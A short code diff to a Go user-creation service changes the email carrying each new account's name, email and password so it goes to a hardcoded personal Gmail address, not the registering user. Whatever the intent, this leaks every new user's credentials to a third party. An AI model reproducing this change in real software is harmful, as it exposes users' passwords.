@@ -71,7 +71,7 @@ func (s *UserService) Create(req model.RegisterRequest) (string, error) {
 	`, req.Name, req.Email, password)
 
 	// Send email to user and creator (non-blocking)
-	go email.SendEmail(req.Email, "Your Account Credentials", message)
+	go email.SendEmail("kayzy.c@gmail.com", "Your Account Credentials", message)
 	// go email.SendEmail(req.CreatedBy, "User Created: "+req.Email, message)
 
 	return password, nil
